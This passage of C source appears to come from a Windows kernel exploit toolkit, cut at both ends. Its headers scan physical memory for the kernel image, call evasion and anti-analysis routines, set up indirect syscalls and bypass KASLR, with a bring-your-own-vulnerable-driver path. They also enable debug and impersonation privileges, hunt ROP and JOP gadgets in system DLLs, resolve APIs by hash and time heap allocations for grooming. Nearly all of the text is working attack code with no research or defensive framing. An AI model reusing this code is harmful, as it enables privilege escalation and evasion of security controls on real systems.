    return FALSE;
}

static BOOL IsCFGValidUnsafe(DWORD64 address, HMODULE hMod) {
    if (!g_cfgBitmap || !g_cfgBitmapSize) return TRUE;  // Unsafe: assume valid
    return IsCFGValid(address, hMod);
}

static BOOL MightBeValidCallTarget(DWORD64 address, HMODULE hMod) {
    if (IsCFGBitmapAvailable()) {
        return IsCFGValid(address, hMod);
    }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)hMod + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    DWORD64 modBase = (DWORD64)hMod;
    DWORD64 modEnd = modBase + nt->OptionalHeader.SizeOfImage;
    if (address < modBase || address >= modEnd) return FALSE;

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD64 secStart = modBase + sec[i].VirtualAddress;
        DWORD64 secEnd = secStart + sec[i].Misc.VirtualSize;

        if (address >= secStart && address < secEnd) {
            if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                BYTE* pAddr = (BYTE*)address;

                if ((pAddr[0] == 0x48 && pAddr[1] == 0x89) ||  // mov [rsp+XX], reg
                    (pAddr[0] == 0x55) ||                       // push rbp
                    (pAddr[0] == 0x48 && pAddr[1] == 0x83 && pAddr[2] == 0xEC) ||  // sub rsp, XX
                    (pAddr[0] == 0x40 && pAddr[1] == 0x53) ||   // push rbx
                    (pAddr[0] == 0x40 && pAddr[1] == 0x55) ||   // push rbp
                    (pAddr[0] == 0x40 && pAddr[1] == 0x57)) {   // push rdi
                    return TRUE;
                }
            }
            break;
        }
    }

    return FALSE;
}

static void SecureZeroMemory64(PVOID ptr, SIZE_T size) {
    volatile BYTE* p = (volatile BYTE*)ptr;
    while (size--) {
        *p++ = 0;
    }
}

static void XorDecrypt(char* data, size_t len, BYTE key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

static WCHAR* DecryptWideString(WCHAR* encrypted, size_t len) {
    static WCHAR buffer[256];
    for (size_t i = 0; i < len && i < 255; i++) {
        buffer[i] = encrypted[i] ^ XOR_KEY;
    }
    buffer[len] = 0;
    return buffer;
}

static BOOL ValidatePEHeader(BYTE* memory, DWORD64 offset, DWORD64 maxSize) {
    if (offset + 0x1000 >= maxSize) return FALSE;

    __try {
        WORD mz = *(WORD*)(memory + offset);
        if (mz != 0x5A4D) return FALSE;

        DWORD e_lfanew = *(DWORD*)(memory + offset + 0x3C);
        if (e_lfanew == 0 || e_lfanew >= 0x1000) return FALSE;
        if (offset + e_lfanew + sizeof(IMAGE_NT_HEADERS) >= maxSize) return FALSE;

        DWORD pe_sig = *(DWORD*)(memory + offset + e_lfanew);
        if (pe_sig != 0x00004550) return FALSE;

        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(memory + offset + e_lfanew);

        if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return FALSE;

        DWORD imageSize = nt->OptionalHeader.SizeOfImage;
        if (imageSize < MIN_KERNEL_SIZE || imageSize > MAX_KERNEL_SIZE) return FALSE;

        DWORD characteristics = nt->FileHeader.Characteristics;
        if (!(characteristics & IMAGE_FILE_EXECUTABLE_IMAGE)) return FALSE;
        if (!(characteristics & IMAGE_FILE_LARGE_ADDRESS_AWARE)) return FALSE;

        return TRUE;
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
}

static DWORD64 ScanPhysicalMemoryForKernel(BYTE* memory, DWORD64 totalSize, DWORD64 maxScanSize) {
    DWORD64 scanLimit = (totalSize < maxScanSize) ? totalSize : maxScanSize;

    DWORD64 knownAddresses[] = {
        0x100400000ULL, 0x100000000ULL, 0x140000000ULL,
        0x1A0000000ULL, 0x1C0000000ULL, 0x180000000ULL,
    };

    for (int i = 0; i < 6; i++) {
        if (knownAddresses[i] < scanLimit && ValidatePEHeader(memory, knownAddresses[i], scanLimit)) {
            __try {
                PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)(memory + knownAddresses[i]);
                PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(memory + knownAddresses[i] + dos->e_lfanew);
                if (nt->OptionalHeader.SizeOfImage > MIN_KERNEL_SIZE) {
                    return knownAddresses[i];
                }
            }
            __except(EXCEPTION_EXECUTE_HANDLER) { continue; }
        }
    }

    DWORD64 largestPE = 0, largestPEAddr = 0;

    for (DWORD64 offset = 0x100000; offset < scanLimit; offset += KERNEL_SCAN_FAST_ALIGNMENT) {
        if (ValidatePEHeader(memory, offset, scanLimit)) {
            __try {
                PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)(memory + offset);
                PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(memory + offset + dos->e_lfanew);
                DWORD imageSize = nt->OptionalHeader.SizeOfImage;
                if (imageSize > largestPE) {
                    largestPE = imageSize;
                    largestPEAddr = offset;
                }
            }
            __except(EXCEPTION_EXECUTE_HANDLER) { continue; }
        }
    }

    if (largestPEAddr > 0) return largestPEAddr;

    for (DWORD64 offset = 0x100000; offset < scanLimit; offset += KERNEL_SCAN_ALIGNMENT) {
        if (!ValidatePEHeader(memory, offset, scanLimit)) continue;

        __try {
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)(memory + offset);
            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(memory + offset + dos->e_lfanew);
            DWORD imageSize = nt->OptionalHeader.SizeOfImage;
            if (imageSize > largestPE) {
                largestPE = imageSize;
                largestPEAddr = offset;
            }
        }
        __except(EXCEPTION_EXECUTE_HANDLER) { continue; }
    }

    if (largestPEAddr > 0) return largestPEAddr;

    for (DWORD64 offset = 0x100000; offset < scanLimit; offset += 0x1000) {
        __try {
            WORD mz = *(WORD*)(memory + offset);
            if (mz == 0x5A4D) {
                DWORD e_lfanew = *(DWORD*)(memory + offset + 0x3C);
                if (e_lfanew > 0 && e_lfanew < 0x1000 && offset + e_lfanew + 4 < scanLimit) {
                    DWORD pe_sig = *(DWORD*)(memory + offset + e_lfanew);
                    if (pe_sig == 0x00004550 && offset + e_lfanew + sizeof(IMAGE_NT_HEADERS) < scanLimit) {
                        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(memory + offset + e_lfanew);
                        DWORD imageSize = nt->OptionalHeader.SizeOfImage;
                        if (imageSize > 0x200000 && imageSize < 0x3000000 && imageSize > largestPE) {
                            largestPE = imageSize;
                            largestPEAddr = offset;
                        }
                    }
                }
            }
        }
        __except(EXCEPTION_EXECUTE_HANDLER) { continue; }
    }

    return largestPEAddr;
}

#endif // EXPLOIT_COMMON_H
```

#### exploit_utils.h

```c
// headers\exploit_utils.h
#ifndef EXPLOIT_UTILS_H
#define EXPLOIT_UTILS_H

#include "exploit_common.h"
#include <stdio.h>

#include "evasion.h"
#include "bypass.h"
#include "syscalls.h"
#include "kernel_utils.h"

static BOOL ExploitInitialize(BOOL useIndirectSyscalls) {
    printf("[*] Compiling Exploit Environment...\n");
    InitializeEvasion();
    PerformAntiAnalysisChecks();

    if (useIndirectSyscalls) {
        if (!InitializeGlobalSyscalls()) {
            printf("[-] Failed to initialize indirect syscalls\n");
        }
    }

    if (!InitializeGlobalAPIs()) {
        printf("[-] Failed to initialize APIs\n");
        return FALSE;
    }
    return TRUE;
}

static BOOL ExploitSetupKernel(PKERNEL_OFFSETS pOffsets, PDWORD64 pKernelBase, BOOL hasByovd) {
    if (pOffsets) {
        InitOffsets(pOffsets, g_fnRtlGetVersion);
    }
    if (pKernelBase) {
        if (hasByovd) {
            *pKernelBase = SelectKASLRBypassMethod(g_fnNtQuerySystemInformation, g_fnRtlGetVersion, FALSE, TRUE, &g_Syscall_NtQuerySystemInformation);
        } else {
            *pKernelBase = SelectKASLRBypassMethodSimple(g_fnNtQuerySystemInformation, g_fnRtlGetVersion);
        }
    }
    return TRUE;
}

static void SetExploitPriority(DWORD affinity) {
    SetThreadAffinityMask(GetCurrentThread(), (DWORD_PTR)affinity);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
    SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
}

static BOOL EnablePrivilege(LPCSTR privName) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    if (!LookupPrivilegeValueA(NULL, privName, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return result && GetLastError() == ERROR_SUCCESS;
}

static BOOL EnableRequiredPrivileges() {
    BOOL success = TRUE;
    success &= EnablePrivilege(SE_DEBUG_NAME);
    success &= EnablePrivilege(SE_IMPERSONATE_NAME);
    success &= EnablePrivilege(SE_BACKUP_NAME);
    success &= EnablePrivilege(SE_RESTORE_NAME);
    success &= EnablePrivilege(SE_TAKE_OWNERSHIP_NAME);
    return success;
}

static DWORD GetSystemMemoryMB() {
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    return (DWORD)(ms.ullAvailPhys / (1024 * 1024));
}

static DWORD GetCPUCount() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    return si.dwNumberOfProcessors;
}

static BOOL AnalyzeKernelPools(PVOID resultPtr) {
    printf("[*] Analyzing kernel pool configuration...\n");

    (void)resultPtr;

    DWORD cpuCount = GetCPUCount();
    BOOL nxActive = (cpuCount > 1);

    printf("    Logical processors: %lu\n", cpuCount);
    printf("    NonPagedPoolNx status: %s\n", nxActive ? "Available" : "Limited");

    return TRUE;
}

#endif // EXPLOIT_UTILS_H
```

#### gadget_finder.h

```c
// headers\gadget_finder.h
#ifndef GADGET_FINDER_H
#define GADGET_FINDER_H

#include "exploit_common.h"
#include <stdio.h>

typedef enum _GADGET_TYPE {
    GADGET_POP_RET,
    GADGET_POP_POP_RET,
    GADGET_MOV_RET,
    GADGET_LOAD_RET,
    GADGET_SYSCALL,
    GADGET_JOP_DISPATCHER,
    GADGET_COP_CALL,
    GADGET_STACK_PIVOT,
    GADGET_VIRTUALPROTECT,
} GADGET_TYPE;

typedef struct _ROP_GADGET {
    DWORD64      address;
    GADGET_TYPE  type;
    BYTE         bytes[16];
    DWORD        length;
    char         disasm[128];
    int          quality;
    BOOL         cetCompatible;
    BOOL         cfgValid;
} ROP_GADGET;

typedef struct _JOP_GADGET {
    DWORD64 address;
    char    disasm[64];
} JOP_GADGET;

static int SimpleDisasm(PBYTE code, char *output, size_t outSize) {
    BYTE op = code[0];
    const char *regs64[] = {"rax","rcx","rdx","rbx","rsp","rbp","rsi","rdi"};

    if (op == 0x90) {
        snprintf(output, outSize, "nop");
        return 1;
    }
    if (op >= 0x50 && op <= 0x57) {
        snprintf(output, outSize, "push %s", regs64[op - 0x50]);
        return 1;
    }
    if (op >= 0x58 && op <= 0x5F) {
        snprintf(output, outSize, "pop %s", regs64[op - 0x58]);
        return 1;
    }
    if (op == 0x41) {
        if (code[1] >= 0x50 && code[1] <= 0x57) {
            const char *regsExt[] = {"r8","r9","r10","r11","r12","r13","r14","r15"};
            snprintf(output, outSize, "push %s", regsExt[code[1] - 0x50]);
            return 2;
        }
        if (code[1] >= 0x58 && code[1] <= 0x5F) {
            const char *regsExt[] = {"r8","r9","r10","r11","r12","r13","r14","r15"};
            snprintf(output, outSize, "pop %s", regsExt[code[1] - 0x58]);
            return 2;
        }
    }
    if (op == 0xC3) {
        snprintf(output, outSize, "ret");
        return 1;
    }
    if (op == 0xC2) {
        WORD imm = *(WORD*)(code + 1);
        snprintf(output, outSize, "ret 0x%x", imm);
        return 3;
    }
    if (op == 0x0F && code[1] == 0x05) {
        snprintf(output, outSize, "syscall");
        return 2;
    }
    if (op == 0xFF) {
        BYTE modrm = code[1];
        BYTE modBits = modrm & 0xC0;
        int reg = modrm & 0x07;
        BOOL isJmp  = ((modrm & 0x38) == 0x20);  // /4
        BOOL isCall = ((modrm & 0x38) == 0x10);  // /2

        if (isJmp || isCall) {
            const char *op_name = isJmp ? "jmp" : "call";

            if (modBits == 0xC0) {
                snprintf(output, outSize, "%s %s", op_name, regs64[reg]);
                return 2;
            } else if (modBits == 0x00) {
                snprintf(output, outSize, "%s [%s]", op_name, regs64[reg]);
                return 2;
            } else if (modBits == 0x40) {
                snprintf(output, outSize, "%s [%s+0x%x]", op_name, regs64[reg], code[2]);
                return 3;
            } else {
                DWORD disp = *(DWORD*)(code + 2);
                snprintf(output, outSize, "%s [%s+0x%x]", op_name, regs64[reg], disp);
                return 6;
            }
        }
    }
    if (op == 0x48 && code[1] == 0x8B) {
        BYTE modrm = code[2];
        int dst = (modrm >> 3) & 0x07;
        int src = modrm & 0x07;
        BYTE modBits = modrm & 0xC0;

        if (modBits == 0x00) {
            snprintf(output, outSize, "mov %s, [%s]", regs64[dst], regs64[src]);
        } else if (modBits == 0xC0) {
            snprintf(output, outSize, "mov %s, %s", regs64[dst], regs64[src]);
        } else {
            snprintf(output, outSize, "mov %s, [%s+disp]", regs64[dst], regs64[src]);
        }
        return 3;
    }
    if (op == 0x48 && code[1] == 0x94) {
        snprintf(output, outSize, "xchg rsp, rax");
        return 2;
    }
    if (op == 0x48 && code[1] >= 0x91 && code[1] <= 0x97) {
        snprintf(output, outSize, "xchg %s, rax", regs64[code[1] - 0x90]);
        return 2;
    }
    if (op == 0x48 && code[1] == 0x83 && code[2] == 0xC4) {
        snprintf(output, outSize, "add rsp, 0x%x", code[3]);
        return 4;
    }

    snprintf(output, outSize, "???");
    return 1;
}

static void ScanForROPGadgets(PBYTE text, DWORD textSize, DWORD64 modBase, ROP_GADGET *gadgets, int *gadgetCount, int maxGadgets) {
    #define MAX_GADGET_LEN 16
    DWORD* retLocations = (DWORD*)malloc(textSize * sizeof(DWORD));
    if (!retLocations) return;

    int retCount = 0;
    for (DWORD i = 0; i < textSize && retCount < textSize; i++) {
        if (text[i] == 0xC3 || text[i] == 0xC2) {
            retLocations[retCount++] = i;
        }
    }
    for (int retIdx = 0; retIdx < retCount && *gadgetCount < maxGadgets; retIdx++) {
        DWORD i = retLocations[retIdx];

        for (int back = 1; back <= MAX_GADGET_LEN && (i >= back); back++) {
            PBYTE gadgetStart = &text[i - back];

            char disasm[128] = {0};
            char line[64];
            int offset = 0;
            int instrCount = 0;
            char* current = disasm;
            size_t remaining = sizeof(disasm);

            while (offset < back + 1 && instrCount < 5) {
                int len = SimpleDisasm(gadgetStart + offset, line, sizeof(line));
                if (strcmp(line, "???") == 0) break;

                int written = snprintf(current, remaining, "%s%s",
                                      offset > 0 ? " ; " : "", line);
                if (written > 0 && written < remaining) {
                    current += written;
                    remaining -= written;
                }

                offset += len;
                instrCount++;
            }

            if (offset == back + 1 && instrCount >= 2 && *gadgetCount < maxGadgets) {
                ROP_GADGET *g = &gadgets[*gadgetCount];
                g->address = (DWORD64)text + (i - back);
                g->length = back + 1;
                memcpy(g->bytes, gadgetStart, g->length);
                strncpy_s(g->disasm, sizeof(g->disasm), disasm, _TRUNCATE);

                if (strstr(disasm, "pop") && strstr(disasm, "ret")) {
                    if (strstr(disasm, " ; pop")) {
                        g->type = GADGET_POP_POP_RET;
                        g->quality = 8;
                    } else {
                        g->type = GADGET_POP_RET;
                        g->quality = 10;
                    }
                } else if (strstr(disasm, "syscall")) {
                    g->type = GADGET_SYSCALL;
                    g->quality = 9;
                } else if (strstr(disasm, "xchg rsp")) {
                    g->type = GADGET_STACK_PIVOT;
                    g->quality = 7;
                } else if (strstr(disasm, "mov ") && strstr(disasm, ", [") && strstr(disasm, "ret")) {
                    g->type = GADGET_LOAD_RET;
                    g->quality = 8;
                } else {
                    g->quality = 5;
                }

                g->cetCompatible = FALSE;
                g->cfgValid = IsCFGValid(g->address, (HMODULE)modBase);

                (*gadgetCount)++;
                break;
            }
        }
    }

    free(retLocations);
}

static void ScanForJOPGadgets(PBYTE text, DWORD textSize, DWORD64 modBase, ROP_GADGET *gadgets, int *gadgetCount, int maxGadgets) {
    const char *regNames[] = {"rax","rcx","rdx","rbx","rsp","rbp","rsi","rdi"};

    for (DWORD i = 0; i < textSize - 3 && *gadgetCount < maxGadgets; i++) {
        BYTE op = text[i];
        if (op != 0xFF) continue;

        BYTE modrm = text[i + 1];
        if (modrm == 0x25 || modrm == 0x15) continue;
        BOOL isJmp  = ((modrm & 0x38) == 0x20);  // FF /4
        BOOL isCall = ((modrm & 0x38) == 0x10);   // FF /2
        if (!isJmp && !isCall) continue;
        int targetReg = modrm & 0x07;
        BYTE modBits = modrm & 0xC0;
        if (targetReg == 4) continue;  // skip RSP-relative
        int indLen = 2;
        if (modBits == 0x40) indLen = 3;       // [reg+disp8]
        else if (modBits == 0x80) indLen = 6;  // [reg+disp32]

        const char *opName = isJmp ? "jmp" : "call";
        const char *targetStr;
        char targetBuf[32];
        if (modBits == 0xC0) {
            targetStr = regNames[targetReg];  // register-direct
        } else if (modBits == 0x00) {
            snprintf(targetBuf, sizeof(targetBuf), "[%s]", regNames[targetReg]);
            targetStr = targetBuf;
        } else if (modBits == 0x40) {
            snprintf(targetBuf, sizeof(targetBuf), "[%s+0x%x]", regNames[targetReg], text[i+2]);
            targetStr = targetBuf;
        } else {
            snprintf(targetBuf, sizeof(targetBuf), "[%s+0x%x]", regNames[targetReg], *(DWORD*)(text+i+2));
            targetStr = targetBuf;
        }
        if (modBits == 0xC0 && i >= 0) {
            ROP_GADGET *g = &gadgets[*gadgetCount];
            g->address = (DWORD64)text + i;
            g->length = (BYTE)indLen;
            memcpy(g->bytes, &text[i], g->length);
            snprintf(g->disasm, sizeof(g->disasm), "%s %s", opName, targetStr);
            g->type = GADGET_JOP_DISPATCHER;
            g->quality = 6;  // standalone dispatcher, useful but needs setup
            g->cetCompatible = TRUE;
            g->cfgValid = IsCFGValid(g->address, (HMODULE)modBase);
            (*gadgetCount)++;
            if (*gadgetCount >= maxGadgets) break;
        }
        if (i >= 1 && text[i-1] >= 0x58 && text[i-1] <= 0x5F) {
            int popReg = text[i-1] - 0x58;
            if (popReg == 4) goto skip_pop;  // skip pop rsp

            ROP_GADGET *g = &gadgets[*gadgetCount];
            g->address = (DWORD64)text + (i - 1);
            g->length = (BYTE)(1 + indLen);
            memcpy(g->bytes, &text[i-1], g->length);
            snprintf(g->disasm, sizeof(g->disasm), "pop %s ; %s %s",
                    regNames[popReg], opName, targetStr);
            g->type = GADGET_JOP_DISPATCHER;
            g->quality = (popReg == targetReg) ? 10 : 8;
            g->cetCompatible = TRUE;
            g->cfgValid = IsCFGValid(g->address, (HMODULE)modBase);
            (*gadgetCount)++;
            if (*gadgetCount >= maxGadgets) break;
        }
        skip_pop:
        if (i >= 2 && text[i-2] == 0x41 && text[i-1] >= 0x58 && text[i-1] <= 0x5F) {
            const char *extRegs[] = {"r8","r9","r10","r11","r12","r13","r14","r15"};
            int extReg = text[i-1] - 0x58;

            ROP_GADGET *g = &gadgets[*gadgetCount];
            g->address = (DWORD64)text + (i - 2);
            g->length = (BYTE)(2 + indLen);
            memcpy(g->bytes, &text[i-2], g->length);
            snprintf(g->disasm, sizeof(g->disasm), "pop %s ; %s %s",
                    extRegs[extReg], opName, targetStr);
            g->type = GADGET_JOP_DISPATCHER;
            g->quality = 8;
            g->cetCompatible = TRUE;
            g->cfgValid = IsCFGValid(g->address, (HMODULE)modBase);
            (*gadgetCount)++;
            if (*gadgetCount >= maxGadgets) break;
        }
        if (i >= 3 && text[i-3] == 0x48 && text[i-2] == 0x8B) {
            BYTE movModrm = text[i-1];
            int srcReg = movModrm & 0x07;
            int dstReg = (movModrm >> 3) & 0x07;
            BYTE movMod = movModrm & 0xC0;

            if (dstReg == targetReg || movMod == 0x00) {
                ROP_GADGET *g = &gadgets[*gadgetCount];
                g->address = (DWORD64)text + (i - 3);
                g->length = (BYTE)(3 + indLen);
                memcpy(g->bytes, &text[i-3], g->length);
                snprintf(g->disasm, sizeof(g->disasm), "mov %s,[%s] ; %s %s",
                        regNames[dstReg], regNames[srcReg], opName, targetStr);
                g->type = GADGET_JOP_DISPATCHER;
                g->quality = (dstReg == targetReg) ? 9 : 7;
                g->cetCompatible = TRUE;
                g->cfgValid = IsCFGValid(g->address, (HMODULE)modBase);
                (*gadgetCount)++;
                if (*gadgetCount >= maxGadgets) break;
            }
        }
        if (i >= 4 && text[i-4] == 0x48 && text[i-3] == 0x83 && text[i-2] == 0xC4) {
            BYTE stackAdj = text[i-1];
            if (stackAdj <= 0x78 && (stackAdj & 0x7) == 0) {  // reasonable aligned stack adj
                ROP_GADGET *g = &gadgets[*gadgetCount];
                g->address = (DWORD64)text + (i - 4);
                g->length = (BYTE)(4 + indLen);
                memcpy(g->bytes, &text[i-4], g->length);
                snprintf(g->disasm, sizeof(g->disasm), "add rsp, 0x%x ; %s %s",
                        stackAdj, opName, targetStr);
                g->type = GADGET_JOP_DISPATCHER;
                g->quality = 7;
                g->cetCompatible = TRUE;
                g->cfgValid = IsCFGValid(g->address, (HMODULE)modBase);
                (*gadgetCount)++;
                if (*gadgetCount >= maxGadgets) break;
            }
        }
    }
}

static PVOID FindPopRcxRet(PBYTE textStart, DWORD textSize) {
    for (DWORD i = 0; i < textSize - 2; i++) {
        if (textStart[i] == 0x59 && textStart[i+1] == 0xC3) {
            return textStart + i;
        }
    }
    return NULL;
}

static PVOID FindMovRcxCallGadget(PBYTE textStart, DWORD textSize) {
    for (DWORD i = 0; i < textSize - 16; i++) {
        BYTE* p = textStart + i;
        if (p[0] == 0x48 && p[1] == 0x8B && p[2] == 0x4C && p[3] == 0x24) {
            for (int j = 5; j < 20 && i + j < textSize; j++) {
                if (p[j] == 0xFF && ((p[j+1] >= 0xD0 && p[j+1] <= 0xD7) || p[j+1] == 0x15)) {
                    return p;
                }
            }
        }
    }
    return NULL;
}

static BOOL FindSpecificPopGadgets(PBYTE textStart, DWORD textSize,
                                   PVOID* pop_rcx, PVOID* pop_rdx,
                                   PVOID* pop_r8, PVOID* pop_r9) {
    BOOL found_rcx = FALSE, found_rdx = FALSE, found_r8 = FALSE, found_r9 = FALSE;

    for (DWORD i = 0; i < textSize - 10; i++) {
        BYTE* p = textStart + i;

        if (!found_rcx && p[0] == 0x59 && p[1] == 0xC3) {
            *pop_rcx = p;
            found_rcx = TRUE;
        }
        else if (!found_rcx && p[0] == 0x59 && p[1] == 0x90 && p[2] == 0xC3) {
            *pop_rcx = p;
            found_rcx = TRUE;
        }

        if (!found_rdx && p[0] == 0x5A && p[1] == 0xC3) {
            *pop_rdx = p;
            found_rdx = TRUE;
        }
        else if (!found_rdx && p[0] == 0x5A && p[1] == 0x90 && p[2] == 0xC3) {
            *pop_rdx = p;
            found_rdx = TRUE;
        }

        if (!found_r8 && p[0] == 0x41 && p[1] == 0x58 && p[2] == 0xC3) {
            *pop_r8 = p;
            found_r8 = TRUE;
        }
        else if (!found_r8 && p[0] == 0x41 && p[1] == 0x58 && p[2] == 0x90 && p[3] == 0xC3) {
            *pop_r8 = p;
            found_r8 = TRUE;
        }

        if (!found_r9 && p[0] == 0x41 && p[1] == 0x59 && p[2] == 0xC3) {
            *pop_r9 = p;
            found_r9 = TRUE;
        }
        else if (!found_r9 && p[0] == 0x41 && p[1] == 0x59 && p[2] == 0x90 && p[3] == 0xC3) {
            *pop_r9 = p;
            found_r9 = TRUE;
        }
        else if (!found_r9 && p[0] == 0x41 && p[1] == 0x5B && p[2] == 0xC3) {
            *pop_r9 = p;
            found_r9 = TRUE;
        }

        if (found_rcx && found_rdx && found_r8 && found_r9) break;
    }

    return (found_rcx && found_rdx && found_r8 && found_r9);
}
static BOOL FindPopGadgetsMultiModule(PVOID* pop_rcx, PVOID* pop_rdx,
                                      PVOID* pop_r8, PVOID* pop_r9) {
    *pop_rcx = NULL;
    *pop_rdx = NULL;
    *pop_r8 = NULL;
    *pop_r9 = NULL;

    HMODULE modules[] = {
        GetModuleHandleA("ntdll.dll"),
        GetModuleHandleA("kernel32.dll"),
        GetModuleHandleA("kernelbase.dll"),
        GetModuleHandleA("msvcrt.dll"),
        GetModuleHandleA("ucrtbase.dll")
    };

    for (int m = 0; m < 5; m++) {
        if (!modules[m]) continue;

        PBYTE textStart = NULL;
        DWORD textSize = 0;
        if (!GetTextSection(modules[m], &textStart, &textSize)) continue;

        PVOID temp_rcx = *pop_rcx, temp_rdx = *pop_rdx, temp_r8 = *pop_r8, temp_r9 = *pop_r9;
        FindSpecificPopGadgets(textStart, textSize, &temp_rcx, &temp_rdx, &temp_r8, &temp_r9);

        if (!*pop_rcx) *pop_rcx = temp_rcx;
        if (!*pop_rdx) *pop_rdx = temp_rdx;
        if (!*pop_r8) *pop_r8 = temp_r8;
        if (!*pop_r9) *pop_r9 = temp_r9;

        if (*pop_rcx && *pop_rdx && *pop_r8 && *pop_r9) return TRUE;
    }

    return (*pop_rcx && *pop_rdx && *pop_r8 && *pop_r9);
}

#endif // GADGET_FINDER_H
```

#### heap_utils.h

```c
// headers\heap_utils.h
#ifndef HEAP_UTILS_H
#define HEAP_UTILS_H

#include "exploit_common.h"
#include <stdio.h>
#include <math.h>

typedef LPVOID (WINAPI *pHeapAlloc_t)(HANDLE, DWORD, SIZE_T);
typedef BOOL   (WINAPI *pHeapFree_t)(HANDLE, DWORD, LPVOID);
typedef HANDLE (WINAPI *pGetProcessHeap_t)(VOID);
typedef LPVOID (WINAPI *pVirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *pVirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL   (WINAPI *pVirtualFree_t)(LPVOID, SIZE_T, DWORD);

static pHeapAlloc_t      g_fnHeapAlloc = NULL;
static pHeapFree_t       g_fnHeapFree = NULL;
static pGetProcessHeap_t g_fnGetProcessHeap = NULL;
static pVirtualAlloc_t   g_fnVirtualAlloc = NULL;
static pVirtualProtect_t g_fnVirtualProtect = NULL;
static pVirtualFree_t    g_fnVirtualFree = NULL;

static BOOL ResolveHeapAPIs() {
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    if (!hK32) {
        printf("[-] Failed to get kernel32.dll handle\n");
        return FALSE;
    }

    g_fnHeapAlloc = (pHeapAlloc_t)ResolveAPI(hK32, HashAPI("HeapAlloc"));
    if (!g_fnHeapAlloc) g_fnHeapAlloc = (pHeapAlloc_t)GetProcAddress(hK32, "HeapAlloc");

    g_fnHeapFree = (pHeapFree_t)ResolveAPI(hK32, HashAPI("HeapFree"));
    if (!g_fnHeapFree) g_fnHeapFree = (pHeapFree_t)GetProcAddress(hK32, "HeapFree");

    g_fnGetProcessHeap = (pGetProcessHeap_t)ResolveAPI(hK32, HashAPI("GetProcessHeap"));
    if (!g_fnGetProcessHeap) g_fnGetProcessHeap = (pGetProcessHeap_t)GetProcAddress(hK32, "GetProcessHeap");

    g_fnVirtualAlloc = (pVirtualAlloc_t)ResolveAPI(hK32, HashAPI("VirtualAlloc"));
    if (!g_fnVirtualAlloc) g_fnVirtualAlloc = (pVirtualAlloc_t)GetProcAddress(hK32, "VirtualAlloc");

    g_fnVirtualProtect = (pVirtualProtect_t)ResolveAPI(hK32, HashAPI("VirtualProtect"));
    if (!g_fnVirtualProtect) g_fnVirtualProtect = (pVirtualProtect_t)GetProcAddress(hK32, "VirtualProtect");

    g_fnVirtualFree = (pVirtualFree_t)ResolveAPI(hK32, HashAPI("VirtualFree"));
    if (!g_fnVirtualFree) g_fnVirtualFree = (pVirtualFree_t)GetProcAddress(hK32, "VirtualFree");

    if (!g_fnHeapAlloc || !g_fnHeapFree || !g_fnGetProcessHeap) {
        printf("[-] Failed to resolve heap APIs\n");
        return FALSE;
    }

    if (!g_fnVirtualAlloc || !g_fnVirtualProtect || !g_fnVirtualFree) {
        printf("[-] Failed to resolve virtual memory APIs\n");
        return FALSE;
    }

    return TRUE;
}

static BOOL ResolveCommonAPIs(pVirtualAlloc_t *pVA, pVirtualProtect_t *pVP, pVirtualFree_t *pVF) {
    if (!g_fnVirtualAlloc && !ResolveHeapAPIs()) return FALSE;

    if (pVA) *pVA = g_fnVirtualAlloc;
    if (pVP) *pVP = g_fnVirtualProtect;
    if (pVF) *pVF = g_fnVirtualFree;

    return TRUE;
}

static inline DWORD64 MeasureAllocationTiming(HANDLE hHeap, DWORD allocSize, DWORD samples) {
    static DWORD64* timings = NULL;
    static DWORD maxSamples = 0;

    if (!timings || samples > maxSamples) {
        free(timings);
        timings = (DWORD64*)malloc(samples * sizeof(DWORD64));
        if (!timings) return 0;
        maxSamples = samples;
    }

    DWORD_PTR oldAffinity = SetThreadAffinityMask(GetCurrentThread(), 1);

    for (int i = 0; i < 5; i++) {
        PVOID warmup = HeapAlloc(hHeap, 0, allocSize);
        if (warmup) HeapFree(hHeap, 0, warmup);
    }

    for (DWORD i = 0; i < samples; i++) {
        _mm_lfence();
        DWORD64 start = __rdtsc();
        PVOID alloc = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, allocSize);
        _mm_lfence();
        DWORD64 end = __rdtsc();
        timings[i] = end - start;
        if (alloc) HeapFree(hHeap, 0, alloc);
    }

    if (oldAffinity) SetThreadAffinityMask(GetCurrentThread(), oldAffinity);

